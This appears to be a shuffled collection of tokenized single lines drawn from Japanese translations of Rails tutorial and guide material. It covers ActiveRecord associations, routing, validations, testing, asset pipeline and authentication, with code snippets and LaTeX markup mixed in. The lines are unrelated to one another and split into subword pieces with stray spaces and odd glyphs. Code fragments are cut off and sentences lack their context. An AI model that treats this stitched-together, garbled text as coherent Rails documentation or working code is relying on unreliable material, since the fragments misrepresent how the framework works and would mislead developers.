▁ 親 オブジェクト ( ` has _ and _ belongs _ to _ many ` 関連付けを 宣言 している 側 の オブジェクト ) が保存され ない場合 ( つまり ` new _ record ?` が ` true ` を返す 場合 ) 、 子 オブジェクトは 追加 時に 保存 されません 。
▁これにより 、 ルーティング で 以下のような パス が 認 識 できるようになります 。
▁NOTE : ▁上の例では " staging " という カスタマイズ した 環境 を使用しています ▟ これは 本番 ▁( production 環境 ) ▁ に 準 じ た 状態 で テスト を行う ための 環境 です 。
▁* ▁ ビューの 出力 には 基本的に ` main ` レイアウト が使用されます 。
▁| ▁POST ▁| ▁ / photos ▁| ▁images # create ▁| ▁photos _ path ▁|
▁{0} リスト 2▖ 7 {/0} ▁╼╼{1} index アクションに 対応 している ビュー {2} {/2} ▁ {3} app / views / users / index ▖ html ▖ erb {/3} {/1}
▁(\ k ode { curl } コマンド の詳細については 、\ href { http :// c onquering the command line ▖ com / book / curl }{\ emph { C onquering ▁the ▁Command ▁L in e } という 本 の 第 3 章 } ▁( 英語 ) ▁ を参照してください ) ▁ 。
▁* ▁` after _ remove `
▁#### ▁` deep _ merge ` と ` deep _ merge !
▁validates ▁: b io , ▁length : ▁ { ▁ maximum : ▁50 0 ▁ }
▁### ▁ 複 製
▁gem ▁' therubyracer '
▁ これはリスト \ ref { code : initial _ create _ session } で使用されていました 。
▁(\ emph { Note } : ▁If ▁you ▁complete d ▁the ▁exercise ▁corresponding ▁to ▁Listing ▁\ ref { code : base _ title _ test }, ▁you ▁should ▁re tain ▁the ▁\ k ode { setup } ▁method ▁defin ing ▁the ▁\ k ode {@ base _ title } ▁variable ▖)
▁do _ stuff
▁ コンソール に 戻 って \ k ode { password _ digest } 属性 を参照 してみる と 、 リスト \ ref { code : password _ implementation } の \ k ode { has _ secure _ password } の 効果 を 確 認 できます 。
▁* ▁ irc ▖ free n ode ▖ net 上の [ # rubyonrails ]( irc :// irc ▖ free n ode ▖ net / # rubyonrails ) チ ャ ン ネ ル
▁上 に示したように 、\ k ode { map } メソッドは 、 与えられた ブロック を 配列 や 範囲 オブジェクト の各 要素 に対して 適用 し 、 その 結果 を返します 。
▁class ▁ Picture ▁< ▁ActiveRecord :: Base
▁invoke ▁test _ unit
▁ここで 渡す ブロック は rake タスク として _ 実行される _ ▁ ことにご注意ください 。
▁#### # ▁`: through `
▁まずは 存在する ユーザー から 探 してみましょう 。
▁( 上の テストコード で 繰り返し 使われ ている 「 Ruby ▁on ▁Rails ▁Tutorial ▁ Sample ▁App 」 という 文字列を 一 刻 も 早く リファクタリング した く て た ま らない 方 には 、\ ref { sec : static _ pages _ exercises } の演習 を お す す め します ▟)
▁# ▁ 指定された 数値 を デフォルトの 日付 として 持つ セレクト ボックス を生成する
▁ テーブル に含まれる フィールド の すべての レコード における 合 計 を得る には 、 その テーブル を持つ クラス に対して ` sum ` メソッド を呼び出します 。
▁<%= ▁submit _ tag ▁' Create ' ▁%>
▁create ▁app / views / microposts / index ▖ json ▖ jbuilder
▁` welcome _ email ` という名前の メソッド を追加し 、 ユーザーが 登録 した メールアドレス に メールを送信 できるように してみましょう 。
▁ これはリスト \ ref { code : g en er al _ authenticated _ p } で使用されていました 。
▁今回の場合 、 ▁About ページ を使用 できるように するには 、\ k ode { about } アクションを StaticPages コントローラ の中に 追加 する必要があります 。
▁上の 2 つの ビュー では 同じ パーシャル が レンダリング されます が 、 Action ▁View の submit ヘルパーは new アクション の 場合には " Create ▁ Z one " を返し 、 edit アクション の場合は " Update ▁ Z one " を返します 。
▁### ▁Ajax インジェクション
▁ 攻撃者は 、 ユーザーを フ ィ ッ シ ング サイト にリダイレクトし ( フ ィ ッ シ ング サイトの 見た 目 は 本 物 そ っ く り に 作 っ ておきます ) 、 ユーザー を再度 ログイン させ て その ログイン 情報を 攻撃者 に 送信 することができます 。
▁ それ には まず 、 ド ル 記 号 ▁( $ ) ▁ を使用して DOM 要素 に 一意 の CSS ▁id で アクセス する 文法 について 知 る必要があります 。
▁Rails アプリケーションで リソース のルーティング に " / assets " ルート を使用している場合 、 コンフリクト を避けるために 以下の 変更 を加え ます 。
▁ 初めて の リポジトリ セットアップ
▁### ▁ メソッド 委譲
▁リスト { p 0} で {2} users {/2} テーブル を 最初に 生成 するとき 、 {2} name : string {/2} や {2} email : string {/2} といった 引数 を与え ていた ことを思い出してください 。
▁` where ` 句 と同様 、` AND ` 条件 を使用して スコープ を マージ できます 。
▁NOTE : ▁ 単数形 リソース は 複数形 の コントローラ に割り当てられ ます ▟ これは 、 同じ コントローラで 単数形 のルーティング ▁( ` / account ` ) ▁ と 複数形 のルーティング ▁( ` / account s / 45 ` ) ▁ を 両方 使い たい場合 を 想 定 している ためです 。
▁#### ▁collection _ check _ box es
▁ バージョン番号 の 異なる gem 同士 が コンフリクト すること がある ため 、 一連の gem を 自 己 完 結 的に まとめ た \ emph { gem set } という もの を作成して バージョン を使い 分ける のが 便利です 。
▁ クラス について 学ぶ とき 、\ emph { super class } メソッドを使って \ k ode { クラス 階層 } を調べ てみると よく わかります 。
▁ 空 文字 へのリンク も同様に 例外が発生します 。
▁ / microposts /1
▁ユーザー 表示 ビュー が 正常に 動作 するためには 、 Users コントローラ内の \ k ode { show } アクション に対応する \ k ode {@ user } 変数 を定義する 必要があります 。
▁ 誤 った パスワード
▁ これはリスト \ ref { code : full _ title _ helper _ tests } で使用されていました 。
▁P repared ▁Statements の使用 量 の 増 大 は 、 そのまま データベース で 必要な メモリ ー 量 の 増 大 に つながり ます 。
▁今度は すべての ユーザー を表示する ために 、 全 ユーザーが 格 納 された 変数 を作成し 、 順 々 に 表示する index ビューを 実装します 。
▁About ページ のテスト を追加する 。
▁**` ActionDispatch :: ParamsParser ` **
▁たとえば 、` type ` という 語 は テーブル で S ing le ▁Table ▁In her it ance ▁( ST I ) を指定する ために 予 約 されています 。
▁ どの くらい 細 か く テスト するか は お 任 せ します ▟ リスト \ ref { code : flash _ test } に テンプレート を用意し て お いた ので 、 参考にしてください 。
▁NOTE : ▁ 定義ファイル の場所は ` active _ support / core _ ext / enumerable ▖ rb ` です 。
▁create _ customer !
▁ あるいは 、 多くの ページ で使用する 共通の ヘッダー があり 、 この ヘッダー に 特定の ページ で のみ JavaScript や CSS ファイル を挿入 したい場合 にも 便利です 。
▁ エンジン と アプリケーションは 、 同じ 構造 を 共有 しています 。
▁そこで 、 もし テストで 行 き 詰 ま っ てしまった 場合には 、 そこで 長 々 と 悩 む よりも 思い 切 って ▁( 一 周 目 は ) ▁その 箇所 を スキップ し てしまい ましょう ▟ より お勧め の 方法は 、 テストコード の 完全な 理解 については 欲 張 らず に 後 回 し に し 、 本書 のテスト は 自分の 書いた コード が正しく 動く かどうか の検証 ツール と 割 り 切 って 使う ことです 。
▁ ダイジェスト の 計算 は ユーザー ごとに 行 わ なければならない もの では ないので 、 フィクスチャ ファイル など で わざわざ ユーザー オブジェクト にアクセス する 必 然 性 はありません ▟ そこで 、\ k ode { digest } メソッドを User クラス 自身 に 配置 して クラスメソッド にする ことにしましょう ▁( {1} クラスメソッド {/1} の 作り 方 については { p 2 } で 簡単に 説明しました ) 。
▁ 他の 環境で 実行 したい場合は
▁# ▁ 定数 M は既に 存 在 して ないので 、 定数 M を経由して 到 達 できない
▁ テストをパスさせ るために 、 リスト \ ref { code : test _ with _ password _ confirmation } のように パスワード と パスワード 確 認 の値 を追加します 。
▁この 例 では Ruby ▁ 1▖9▖3 を 前提と しています 。
▁この テストでは \ k ode { have _ title } メソッド を使っています ▟ これは 与えられた コンテンツ に HTML 要素 ▁( タイトル ) ▁ があるかどうかをチェック します 。
▁ マイクロポスト を作成する ▁(\ k ode { user _ id ▁= ▁user ▖ id }) 。
▁else
▁id = \ k ode {1} のマイクロポスト を編集する ページ
▁create ▁app / views / microposts / index ▖ html ▖ erb
▁email = michael %40 michael hartl ▖ com "> Activ ate </ a >╼ - --- == _ mime part _ 5407704 656 b 50 _ 6 1 d 3 fd 19 14 f 4 cd 02 99 6 a - -
▁しかし 例外 が 重要な もの であること も 確 か なので 、\ ref { sec : comments _ for _ various _ reader s } で 推 薦 した Ruby 本 で 例外 について 詳 しく 学ぶ ことをおすすめします
▁{0} 図 7 ▖ 12 {/0} {1} 新規ユーザー のための ユーザー登録フォーム \ href { http :// localhost :3000/ signup }{/ signup } ▟\ href { http :// railstutorial ▖ org / images / figures / signup _ form _ bootstrap - full ▖ png }{( 拡大 ) }{/1}
▁` has _ many ` 関連付けを 宣言 した クラス では 、 以下の 16 の メソッドを 自動的に 利用 できるようになります 。
▁ サイト レイアウト のリンク を変更する 方法 のひとつ として 考え られる のは 、 ERB コード の中で if - else を使用し 、 条件 に応じて リンク を表示し 分ける ことです 。
▁" dude "▖ pluralize (0) ▁# ▁=> ▁" dude s "
▁上の 3 つの ERB は 、 それぞれ スタイルシート 、 JavaScript 、\ k ode { csrf \_ meta \_ tags } メソッドを ページ 内で 展開 する ためのものです ▟ スタイルシート と JavaScript は 、 Asset ▁Pipeline ▁(\ ref { sec : the _ asset _ pipeline }) ▁ の一部 です ▟ csrf \_ meta \_ tags は 、 Web 攻 撃 手法 のひとつ である \ href { http :// en ▖ w ikipedia ▖ org / wiki / C ross - site _ request _ forgery } { ク ロスサイトリクエストフォージェリ ー } ▁( cross - site ▁request ▁ forgery : ▁CSRF ) を防ぐ ために 使われ る Rails の メソッドです 。
▁\ emph { ヒント } : ▁ RailsCast の 「\ href { http :// r ailscasts ▖ com / episodes / 27 0 - authentication - in - rails - 3- 1 } { Rails ▁3▖1 における 認 証 } ▁( 英語 )」 を参照してください ▟ 特に 、\ k ode { params } ハッシュの 構造 の 変更 に注目し てください 。
▁ 開発 中に \ href { http :// en ▖ w ikipedia ▖ org / wiki / S N A F U } { 袋 小 路 } に 迷 い 込 んで しま った 場合 でも 、 これらの 機能 を使えば 元の 状態 を 復 元 できます 。
▁GitHub は リポジトリを 一 般 公開 しない 場合は 有 料 ですが 、 Bitbucket は リポジトリを 一 般 公開 し なくても 容 量 無 制限 かつ 無料 で 利用できます ▟ チュートリアル のために は GitHub よりも Bitbucket の方が 好 都 合 である と 言えます 。
▁JavaScript アセット に ` erb ` 拡張子 を追加する と ▁( ` application ▖ js ▖ erb ` など ) 、 以下のように JavaScript コード 内で ` asset _ path ` ヘルパー を使用できます 。
▁ 現状の 認 証 テストでは 、 ユーザーが サインイン すると ▁[ Pro file ] ▁ や ▁[ Settings ] ▁ などの リンク は 表示される ことを チェック しています 。
▁ い つ も と同様に 、 今 度 のテスト は 赤色 ▁( 失敗 ) ▁ になるはずです 。
▁* ▁` params [: _ method ]` が存在する ときに 、( HTTP の ) メソッド を上書き ます 。
▁\ k ode { {1} リスト 2▖ 9 {/1} } の内容は 、 {2} UsersController {/2} が {2} Microposts Controller {/2} に置き 換 わ っている ほ か は \ emph { {1} リスト 2▖ 4 {/1} } と { 4 } 完全に 同 一 {/4} である 点にご注目ください 。
▁このメソッド の 呼び出し は 、 エンジンの コントローラ / モデル / ルーティング など が 持つ 固有の 名前空間 を 、 アプリケーション 内部 の コンポーネント が 持つ 類似 の 名前空間 から 分 離 する 役 目 を 担 います 。
▁{0}{1} 第 10 章 {/1}{/0} では 、 ▁ メールアドレスが \ emph { 本当に } 有効 であること を確かめるため に 、\ emph { アカウントを有効化する } 機能を サインアップ の 手順 に追加します 。
▁User モデルの \ k ode { name } 属性 を設定する 、 ラベル 付き テキストフィールド 要素 を作成する の に必要な HTML を作成します
▁リスト \ ref { code : name _ presence _ test } の モデルに 倣 って 、\ k ode { email } 属性 の 存在性 についても テスト を書いて みましょう ▁( リスト \ ref { code : email _ presence _ test })▟ 最初は 失敗します が 、 リスト \ ref { code : validates _ presence _ of _ email } のコード を追加する ことで 成功 するようになります 。
▁ これを行なうには 、 適切な ルーティング を 生成 できる ディレクトリ を Rails に 指示 する必要があります 。
▁しかし 、 私 た ち の サンプルアプリケーションの 実装 に はまだ 足 り ない もの があります ▟ それが 何 な のか 、 次の 節 に進む前に 考え てみてください
▁=> ▁{" last _ name "=>" H ar t l ", ▁" first _ name "=>" Michael "}
▁self を省略した 結果を リスト \ ref { code : find _ authenticate _ user } に示します 。
▁さらに 、 この Relationship モデル には 今後 一意性 検証 を追加する 予定です ▟ しかし 、 一意 インデックス を使用し ていれば リレーションシップ が 重複 したときに \ emph { 必ず } エラー になるので 、 現時点では 一意 インデックス で 十分です 。
▁" foo \ n \ n bar "▖ indent (2) ▁# ▁=> ▁" ▁ foo \ n \ n ▁bar "
▁run ▁Rails ▖ application
▁create ▁app / views / users
▁ アプリケーションが MultiJSON に 直接 依 存 している場合 、 以下のような 対応 方法があります 。
▁#### ▁password _ field
▁setup ▁do
▁ どちらの 方 式 も 商 用に 利用できる 品 質 を 備えて います ▟ 前 者 は \ href { http :// github ▖ com /}{ GitHub } や \ href { http :// bitbucket ▖ org /}{ Bitbucket } で 、 後者は \ href { http :// www ▖ fa ce book ▖ com /}{ Facebook } や \ href { http :// twitter ▖ com /}{ Twitter } で それぞれ 採 用 されています 。
▁次に 個 別の \ emph { シナリオ } を追加します 。
▁before フィルター の コメントアウト を 元に戻 して 、 ▁\ passing \ ▁ になる かどうか 確かめ てみましょう ▁( リスト \ ref { code : un comment ed _ before _ filter }) 。
▁### ▁Action ▁Mailer の ビューで URL を生成する
▁ ソース に `: all ` を指定すると 、 stylesheet ディレクトリ にある すべての スタイルシート を含め ることができます 。
▁ バリデーション の タイミング を変更 したい場合 、` on : ▁: create ` を 指定 すれば レコード 新規 作成 時に のみ 検証 が 行われ 、` on : ▁: update ` を 指定 すれば レコード の 更新 時に のみ 検証 が 行われます 。
▁これらの メソッド の使用 には 注意が必要です 。
▁render ▁plain : ▁" O K "
▁ マイクロポスト作成フォーム のある ホ ーム 画面 のモックアップ
▁ 生成された Application メイラー
▁A ▖ x ▁= ▁1
▁この コマンド を実行すると 、 現在の ディレクトリ にある ファイル がすべて 追加 されます ▟ ただし 、\ k ode { ▖ gitignore } に記載されている パターン に ファイル名 が マッチする 場合 、 その ファイルは 追加 されません 。
▁ しかも 、 第 3 章では 一度 も \ k ode { StaticPages Controller ▖ new } を実行し ません でした 。
▁これにより 、 モデルのインスタンス を URL として 扱 う ことができます ▟ これは リソースフルな スタイル を採用する 大きな メ リ ッ ト の 1 つ です 。
▁config ▖ assets ▖ compress ▁= ▁true
▁\ href { http :// r ailscasts ▖ com /}{ RailsCasts } ▁( Ryan ▁Bates ) ▁: ▁ 極めて 質 の高い ▁( ほぼ ) ▁ 無料 の スクリーンキャスト です 。
▁ サインイン 関数 そのもの は 伝 統 的な MVC ▁( model - view - controller ) ) ▁ に 帰 着 します ▟ 特に 、 いくつかの サインイン 関数 については コントローラと ビュー のどちら から も 使用 できるように する必要があります 。
▁` last !` メソッド の動作 は 、 マッチする レコードが 見つからない 場合に ` ActiveRecord :: RecordNotFound ` 例外 が発生する 点 を除いて 、` last ` メソッドと まったく 同じです 。
▁Rails には 豊 富 な ページネーション メソッド があります ▟ 今回は その中で 最も シ ン プ ル かつ 堅牢 な \ href { http :// wiki ▖ github ▖ com / mis la v / will _ paginate /}{ will _ paginate } メソッドを使用して みましょう 。
▁# ▁Use ▁ debugger
▁constraints ▁ subdomain : ▁' admin ' ▁do
▁これらの 3 つの ブラウザに は 、 ページの 任意の 部分を 右 クリック ▁( または Control キーを 押 しながら クリック ) ▁ して 、 要素 を表示する 機能 ▁( In spec t ▁element 機能 ) ▁ が 標準 で 組み 込 まれ ています 。
▁#< Client ▁id : ▁ 22 1, ▁first _ name : ▁" Russ el ">
▁ ページの タイトル が ど れ も ほぼ 同じ ▁( 完全に ではない が ) 。
▁* ▁Rails ▁4▖0 では ` ActionDispatch :: Request ` の導入に伴い ` ActionController :: Abstract Request ` が 非推奨 となり ました 。
▁# ▁ 与えられた ユーザーが フォローしているユーザー 達 のマイクロポスト を返す 。
▁ ge ▖╼ %= ▁< span ▁class =' exercise ' ▁id =' ex - 2 e 6 3 53 ' ></ span >╼ \ end { enumerate }╼╼ ▁% ▁subsection ▁a _ flash _ test ▁( end )╼╼ ▁% ▁section ▁login _ failure ▁( end )╼╼ ▁\ section { ログイン } ▁% ▁( fold )╼ ▁\ label { sec : logging _ in }╼╼
▁* ▁` distinct `
▁この 変更 により リスト \ ref { code : name _ presence _ test } のテスト は ▁\ passing ▁ している はずです 。
▁routes ▖ rb ▁# ▁N O
▁ 著者 にとって 、 Cucumber は 読みやすい が 書く のは 面倒 、 結合テスト は プログラマ ー にとって は それ ほど 読みやすく ない 代わりに 書く のは \ emph { は る か に } 楽 、 という 印 象 です 。
▁しかし 、 モデル を使うと 状 況 は 異なります ▟\ ref { sec : a _ controller _ class } で 見た ように 、 Rails コンソール は 起動 時に Rails の 環境 を自動的に 読み込み 、 その 環境 には モデル も含まれます 。
▁# ▁Person ▖ exists ?( '
▁* ▁ レイアウト を ネスト する方法 ▁( サブ テンプレート )
▁[ Users ] ▁ リンク 用の URL 。
▁ 安全 でない クエリ 生成
▁( 本チュートリアル で 初めて 紹 介 した テクニック ですが 、 この テクニック については 第 \ ref { sec : account _ activations _ resource } 章で もう一度 取り上げ ます ▟ そこで は コールバック を定義する ときに \ emph { メソッド を参照 する } という 慣習 について説明します ▟)
▁ 既に 、 管理者 のみ が ユーザーを削除 できるように 構成 済み です ▟ 削除リンク は 管理者 に しか 表示 されません 。
▁最初に \ k ode { name } 属性 の存在 を確認する テストを 行い ましょう 。
▁`: builder ` オ ブ ション を使用することで 、 独自の ビルダ を 構成 できます 。
▁ 区別 の 決 め 手 となる のは 外部キー ( foreign ▁key ) を どちら に 置く か です ( 外部キー は 、` belongs _ to ` を追加した 方のモデル の テーブル に追加されます )▟ もちろん これ だけで は 決 め ら れ ません ▟ データ の 実際の 意味 について もう少し 考え て み る必要があります 。
▁=> ▁ ActionController :: M e t al
▁ 確 認 を 必 須 に するには 、 確 認 用の 属性 について 存 在 チェック も 追加 しておく ようにしてください ▟ ` presence ` を使用した 存 在 チェック については この後 解説します 。
▁Web フォーム に Ajax を採用する のは 今 や 当 たり 前に なり つ つ あるので 、 Rails でも Ajax を簡単に 実装 できる ようになっています 。
▁ エンジン を生成する
▁以下の例 で 示 します 。
▁* ▁available ▁in ▁this ▁directory ▁and ▁any ▁sub - d ir ec to r ies ▖
▁HTTP /1▖1 ▁200 ▁OK
▁( 指 摘 してくれ た K at ar z y na ▁S i we k に 感 謝 します ▟)
▁#### ▁image _ path
▁### ▁ NOT 条件
▁ 従来 の ネットワーク トラフィック は 西欧 文 化 圏 の ア ル フ ァ ベ ッ ト が ほとんど でした が 、 それ以外の 言語 を 伝える ために Uni code などの 新しい エンコード 方 式 が 使用される よう になって きました 。
▁def ▁some _ method
▁この ブランチ の名前 は ローカル コンピュータ の 自分の リポジトリ 上で しか 使われ ないので 、 どんな 名前 でも 構 いません 。
▁上 によって 以下 が出力されます 。
▁flash ▖ now [: alert ] ▁= ▁" You r ▁book ▁was ▁not ▁found "
▁ このように 作成された コメント には 、 スペース 2 文字 分 の インデント が与えられ ます 。
▁このメソッドは 、 モデル で ` default _ scope ` が指定されてい る が 、 それを 適用 し たくない クエリ がある場合 に 特に 便利です 。
▁* ▁` Rails :: Rack :: Logger ` は 、 リクエストが 開 始 された ことを ログ に 通知 します 。
▁ bundler _ stub s /
▁# ▁</ object >
▁上の 例 でも わかるように 、 フォーマット に `: db ` を指定すると SQL の ` BETWEEN ` 句 が生成されます 。
▁# ▁=> ▁[ [ "1" , ▁" 2 ", ▁"3"] , ▁[" 4 ", ▁"5" , ▁" 0 "] , ▁[" 6 ", ▁"7" , ▁" 0 " ]]
▁この 警 告 は \ ref { sec : professional _ grade _ deployment } で 解決 する 予定です ) 。
▁デフォルトのエラーメッセージは ▁_" must ▁be ▁blank " _ ▁ です 。
▁te }╼╼ ▁% ▁subsection ▁ requiring _ the _ right _ user ▁( end )╼╼ ▁\ subsection { フレンドリーフォワーディング } ▁% ▁( fold )╼ ▁\ label { sec : friendly _ forwarding }╼╼
▁╼╼ ▁% ▁subsection ▁the _ asset _ pipeline ▁( end )╼╼ ▁\ subsection { 素晴らしい 構 文 を備えた スタイルシート } ▁% ▁( fold )╼ ▁\ label { sec : sass }╼╼
▁ユーザーの 認 証 は 、 パスワード の 送信 、 暗号化 、 データベース 内の 暗号化 された 値 と の 比 較 という 手順を 踏 みます 。
▁"2013-03-11 ▁01:05:24" , ▁updated _ at : ▁"2013-03-11 ▁01:05:24" >
▁invoke ▁ css
▁Ruby を 勉 強 した こと のある 方 であれば 、 Rails は ブロック の内容を \ emph { yield } している と 推 測 する ことでしょう ▟ そして 、 その 推 測 は おそらく 正しい でしょう 。
▁ スクリーンキャスト ▁( 英語 ) ▁ は ▁\ href { http :// www ▖ railstutorial ▖ org /}{ Ruby ▁on ▁Rails チュートリアル Web サイト } ( 英語 版 ) で 購 入 できます 。
▁person ▁= ▁Person ▖ new ( name : ▁" J D ")
▁params ▖ require (: article )▖ permit (: title , ▁: text )
▁リスト \ ref { code : account _ activation _ edit _ action } のコード を使用すると 、 リスト \ ref { code : account _ activation _ email } にある URL を 貼 り 付け て ユーザーを 有効化 できます 。
▁NOTE : ▁ 定義ファイル の場所は ` active _ support / core _ ext / object / duplicable ▖ rb ` です 。
▁# ▁=> ▁ { : a => { : b =>1 , ▁: c =>2} }
▁( Rails ▁4 は Ruby ▁1▖8▖7 では 動作 しません ) 。
▁#### ▁` alias _ attribute `
▁ ウェブ 開発
▁ 逆に 無名 モジュール は 、 定義 上 必ず 到 達 不 能 になります 。
▁` Article sController ` に `@ article ▁= ▁Article ▖ new ` を追加した 理由は 、 そう しない と ビューで 受け取る `@ article ` が ` nil ` に なってしまい 、 `@ article ▖ errors ▖ any ?` を呼び出す ところで エラー になっ てしまう ためです ▟ Article のインスタンス 作成 に 成功 した ときは @ article が ` nil ` にならない ように しておきたい わけで す 。
▁\ k ode { user ▖ remember } メソッド が動作する ようになった ので 、 ユーザーの 暗号化 済み ID と 記憶トークン を ブラウザの 永 続 cookies に保存 して 、 永 続 セッション を作成する 準備ができました 。
▁{0} 表 3 ▖2{/0} ▁{1} サンプルアプリケーションの ▁( ほぼ ) ▁ 静的なページ ▟ {/1}
▁ 文字列 の 切り 詰 め では 、 省略 文字列 の長さ も 加 味 される ことに 特に ご注意ください 。
▁< form ▁accept - cha r set =" UT F -8 " ▁action ="/ articles " ▁class =" new _ article " ▁data - remote =" true " ▁id =" new _ article " ▁method =" post ">
▁ メ タ プログラミング は Ruby が 有 する きわめて 強力な 機能 であり 、 Rails の 一見 魔 法 のような 機能 ▁( 訳 注 : ▁ 「 黒 魔 術 」 と呼ばれる こともあります ) ▁ の 多く は 、 Ruby の メ タ プログラミング によって 実現 されています 。
▁t ▖ integer ▁: part _ id
▁* ▁X - Content - Type - Options
▁=> ▁[ 8, ▁17 , ▁42 ]
▁また リスト \ ref { code : gemfile _ carrierwave } では 、 あ と で 必要 になる \ text tt { mini _ magic k } ▁gem と \ text tt { fo g } ▁gems も含め ている点に注目してください ▟ これらの gem は 画像 を リ サイズ したり ▁(\ ref { sec : image _ resizing }) 、 本番環境で 画像 を アップロード する ▁(\ ref { sec : image _ upload _ in _ production }) ▁ ために 使い ます 。
▁{0} クラス 2▖1 7 {/0} ▁╼╼{1} \ k ode { Application Controller } クラスにおける継承 ▁ {3} {/3} ▁ { 4 } app / controllers / application _ controller ▖ rb {/4} {/1}
▁COM ▁A _ U S - ER @ f ▖ b ▖ org ▁f r st ▖ l st @ foo ▖ jp ▁a + b @ baz ▖ c n ]
▁ 結果を 見 るために 、 もう一度 テストを実行 してみましょう 。
▁S te ve は 、 5 % から 20 % もの リクエストが キャッシュ されていない ことに 気 付き ました 。
▁### ▁ 記事 を更新する
▁=> ▁[" a ", ▁" b ", ▁" c "]
▁| ▁HTTP 動詞 ▁| ▁ パス ▁| ▁ コントローラ # アクション ▁| ▁ 目的 ▁|
▁` secrets ▖ secret _ key _ base ` メソッドは 、 改 竄 防止 のために 、 アプリケーションの セッションを 既 知 の 秘密キー と 照 合 するための キー を指定する ときに 使い ます 。
▁デフォルトのエラーメッセージは ▁_" must ▁be ▁ o d d " _ ▁ です 。
▁\ k ode { users } テーブルに \ k ode { password _ digest } カラム を追加する マイグレーション
▁今回の場合 、 すべての navbar クラス には 、\ ref { sec : custom _ css } で インストール する Bootstrap フレームワーク によって 特別な 意味 が与えられ ます 。
▁ メソッドを 組み込み クラス に 追加 できる 柔 軟 性 の 高 さ のおかげで 、 純 粋 な Ruby を 極めて 自然に 拡張 することができます ▁( もちろん 注意 して 使う 必要 は あります が ) 。
▁これにより 、` app / views / comments / _ comment ▖ html ▖ erb ` パーシャル が 、 `@ article ▖ comments ` コレクション に含まれている コメント をすべて 出力する ようになりました 。
▁ 幸 い 、 解決策 の実装 は 簡単です ▟ 実は 、 この問題 は データベース レベルで も 一意性 を強制する だけで 解決 します 。
▁P eter ▁Cooper 著 「\ href { http :// www ▖ a mazon ▖ com / gp / product / 14 3022 36 34 }{\ emph { B eginning ▁Ruby } }」 の最初の 2 、 3 章 を や って み る の も よいでしょう ▟ 同 書 で 扱 っている サンプルアプリケーション は 、 本格的な Web アプリケーションに 比 べ て 非常に 小さい ので 、 比 較 的 や り やすい と思います 。
▁\ k ode { form _ for } ヘルパーは 、 Active ▁Record の オブジェクト に 対応 した フォーム を生成する
▁* ▁ ア フ ター イニシャライザ
▁これらの メソッド のいずれか を使用して HTTP リクエスト を直接 発行する と 、 低 レベル の \ k ode { response } オブジェクト にアクセス できるようになります 。
▁ このような 場合 、 これらの アセット を明示的に プリコンパイル する必要があります 。
▁Rails アプリケーションで Active ▁Record の 関連付けを 効率 的に 使用 するためには 、 以下 について 知 っ ておく 必要があります 。
▁これらの メソッドは 使う と 、 紐 付 い ている ユーザーを \ emph { 通 して } マイクロポスト を作成する ことができます ▁( 慣習 的に 正しい 方法 です ) 。
▁TIP : ▁ ルーティング の詳細については [ Rails のルーティング ]( routing ▖ html ) を参照してください 。
▁さらに 、 Rails には \ emph { マイグレーション } という 機能 があります ▟ データ の定義 を Ruby で 記 述 する ことができ 、 SQL の D D L ▁( Data ▁Defin it ion ▁ Language ) を 新たに 学ぶ 必要がありません 。
▁ / users / new
▁ これはリスト \ ref { code : current _ user } で使用されていました 。
▁{0} 図 1 ▖2{/0} {1} 新規 作成された Rails アプリケーションの ディレクトリ 構造 ▟\ href { http :// railstutorial ▖ org / images / figures / directory _ structure _ rails _4_0 - full ▖ png }{( 拡大 ) }{/1}
▁これにより 、 モデル で 特定の イベント が発生し たときに コードが 透 過 的に 実行される ようになります ▟ レコード の作成 、 更新 、 削除 など さまざまな イベント に対して コールバック を 設定 できます 。
▁ 新規 レコード を作成して 保存 すると 、 SQL の ` INSERT ` 操作 が データベースに 送信されます 。
▁\ k ode { UsersController } クラスにおける継承
▁{0} String {/0} 型 でも 2 55 文字 まで は 格 納 できる ため 、 この 型 でも { p 1 } で 実装 する 140 文字 制限 を 満 た せる のですが 、 {0} T ext {/0} 型の 方が 表現 豊 か な マイクロポストを 実現 できます 。
▁< li >`: smtp ` ▁( default ) ▁-- ▁` config ▖ action _ mailer ▖ smtp _ settings ` で 設定 可能 ▟ </ li >
▁Load ing ▁test ▁environment
▁ DateTime ▖ new ( 1582 , ▁10 , ▁4 , ▁ 23 ) ▁+ ▁1▖ hour
▁ 最も 簡単な 方法は 、 Rake の \ k ode { db : migrate : reset } タスク を実行して データベース を リ セット することです 。
▁if ▁@ business
▁< Location ▁ / assets / >
▁WARNING : ▁ 他の クラスの ` has _ many ` ▁ 関連付け と つながり のある ▁` belongs _ to ` ▁ 関連付け に対して この オプション を使用して は い け ません 。
▁上の ファイルは マニフェスト 内で 以下のように 参 照 されます 。
▁ この問題 は 重 大 である ため 、 編集 可能 になって はならない 属性 に対するテスト を作成する ことを ぜ ひ とも お勧め します ▟\ k ode { admin } 属性 のテスト については 演習 に回します ▁(\ ref { sec : exercises _ administrative _ users }) 。
▁# ▁=> ▁S tr ip ▁these ▁tags !
▁If ▁the ▁refer r ing ▁URL ▁is ▁\ k ode { nil } ▁( as ▁is ▁the ▁case ▁inside ▁some ▁tests ), ▁リスト \ ref { code : microposts _ destroy _ action } ▁set s ▁the ▁\ k ode { root \_ url } ▁as ▁the ▁default ▁using ▁the ▁\ k ode {||} ▁operator ▖
▁$ ▁bundle ▁exec ▁rake ▁test ╼ 3 ▁tests , ▁2 ▁assertions , ▁0 ▁failure s , ▁1 ▁errors , ▁0 ▁skip s
▁# ▁active _ record / model _ schema ▖ rb
▁リスト \ ref { code : errors _ partial } のとき
▁$ ▁bin / rails ▁generate ▁mailer ▁User Mailer
▁ 特に 、 以下の Ruby コードは 、
▁これは 、 メイラー ごとに ` from ` や ` reply _ to ` など を設定します 。
▁ これら をすべて 行なう には 、` author _ name ` 用の ` attr _ accessor ` と 、 author と の関連付け 、 および ` before _ save ` 呼び出し を ` app / models / blorgh / article ▖ rb ` に追加する 必要があります 。
▁[ ブラウザから サイト への 接続 を セキュア な もの に 限 って 許可 する かどうかを指定します ]( http :// ja ▖ w ikipedia ▖ org / wiki / HTTP _ Strict _ Transport _ Security )
▁`: plain `、`: login `、`: c ra m _ md 5 ` のいずれか の シンボル を指定できます 。
▁ここで いつものように 、 マイグレーション を実行して \ k ode { admin } 属性 を追加しましょう ▟ コマンドラインで 、 この 属性 の 型 を \ k ode { boolean } と 指定します 。
▁ Linux や OS ▁X などの Unix 系 システム は 、 ユーザー タスク や システム タスク は \ emph { プロセス ▁( process )} ▁ と呼ばれる 一種の コンテナ の 内部で 実行されます 。
